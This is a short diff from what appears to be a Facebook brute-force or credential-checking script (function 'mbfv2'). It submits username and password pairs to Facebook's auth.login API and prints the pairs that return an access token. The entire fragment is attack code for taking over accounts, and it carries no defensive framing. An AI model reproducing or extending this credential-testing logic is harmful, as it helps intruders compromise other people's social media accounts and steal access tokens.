@@ -172,7 +172,6 @@ def mbfv2():
              }
              api = 'https://b-api.facebook.com/method/auth.login'
              response = requests.get(api, params=params)
-             nama = a["name"]
              if 'EAA' in response.text:
                  print(f"\r\033[1;92m  * 👉 {username}[▪]{password}                       ",end="")
                  print()
